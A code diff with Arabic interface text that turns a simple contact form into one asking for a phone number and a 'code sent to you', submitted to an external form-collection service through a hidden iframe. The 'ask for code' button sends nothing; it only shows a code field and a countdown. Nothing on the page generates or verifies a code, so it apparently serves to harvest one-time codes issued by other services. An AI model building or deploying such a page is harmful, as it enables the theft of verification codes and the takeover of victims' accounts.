@@ -31,7 +31,7 @@
       color: #333;
     }
     input[type="text"],
-    input[type="email"],
+    input[type="tel"],
     textarea {
       width: 100%;
       padding: 10px 12px;
@@ -43,7 +43,7 @@
       box-sizing: border-box;
       font-family: inherit;
     }
-    button {
+    button, .code-button {
       width: 100%;
       padding: 12px;
       background-color: #28a745;
@@ -53,24 +53,116 @@
       font-size: 16px;
       cursor: pointer;
       transition: background-color 0.3s ease;
+      margin-bottom: 15px;
     }
-    button:hover {
+    button:hover:not(:disabled), .code-button:hover:not(:disabled) {
       background-color: #218838;
+    }
+    button:disabled, .code-button:disabled {
+      background-color: #6c757d;
+      cursor: not-allowed;
+    }
+    .success-message {
+      display: none;
+      background-color: #d4edda;
+      color: #155724;
+      border: 1px solid #c3e6cb;
+      padding: 15px;
+      border-radius: 5px;
+      margin-top: 15px;
+      text-align: center;
+      font-weight: bold;
+    }
+    #codeField {
+      display: none;
+    }
+    #timer {
+      font-weight: bold;
+      margin-bottom: 15px;
+      color: #555;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <form action="https://formcarry.com/s/gv93b8b6cht" method="POST">
-    <label for="name">الاسم:</label>
-    <input type="text" id="name" name="name" required placeholder="اكتب اسمك" />
+  <form id="contactForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="handleSubmit(event)">
+    <label for="phone">رقم الهاتف:</label>
+    <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" />
 
-    <label for="email">البريد الإلكتروني:</label>
-    <input type="email" id="email" name="email" required placeholder="example@mail.com" />
+    <button type="button" class="code-button" id="sendCodeBtn" onclick="sendCode()">اسأل الكود</button>
+
+    <div id="timer" style="display:none;">يرجى الانتظار: 08:00</div>
+
+    <div id="codeField">
+      <label for="code">الكود المرسل إليك:</label>
+      <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" />
+    </div>
 
     <label for="message">الرسالة:</label>
     <textarea id="message" name="message" rows="5" required placeholder="اكتب رسالتك هنا"></textarea>
 
     <button type="submit">إرسال</button>
   </form>
+
+  <div class="success-message" id="successMessage">
+    شكراً لتواصلك معنا! تم استلام رسالتك بنجاح.
+  </div>
+
+  <!-- iframe مخفي لإرسال البيانات بدون إعادة تحميل الصفحة -->
+  <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+  <script>
+    let countdownInterval;
+
+    function sendCode() {
+      const phoneInput = document.getElementById('phone');
+      const sendCodeBtn = document.getElementById('sendCodeBtn');
+      const timerDisplay = document.getElementById('timer');
+
+      // تحقق من صحة رقم الهاتف
+      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
+        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
+        phoneInput.focus();
+        return;
+      }
+
+      // هنا يمكنك إضافة كود إرسال الكود عبر API أو خدمة خارجية حسب حاجتك
+
+      // إظهار خانة الكود
+      document.getElementById('codeField').style.display = 'block';
+
+      // تعطيل زر "اسأل الكود" وإظهار المؤقت
+      sendCodeBtn.disabled = true;
+      timerDisplay.style.display = 'block';
+
+      // إعداد العد التنازلي 8 دقائق = 480 ثانية
+      let timeLeft = 480;
+
+      function updateTimer() {
+        const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+        const seconds = (timeLeft % 60).toString().padStart(2, '0');
+        timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${seconds}`;
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          timerDisplay.style.display = 'none';
+          sendCodeBtn.disabled = false;
+        }
+        timeLeft--;
+      }
+
+      updateTimer(); // تحديث فوري
+      countdownInterval = setInterval(updateTimer, 1000);
+    }
+
+    function handleSubmit(event) {
+      const successMessage = document.getElementById('successMessage');
+      successMessage.style.display = 'block';
+      event.target.reset();
+      document.getElementById('codeField').style.display = 'none';
+      document.getElementById('timer').style.display = 'none';
+      document.getElementById('sendCodeBtn').disabled = false;
+      clearInterval(countdownInterval);
+    }
+  </script>
 </body>
 </html>
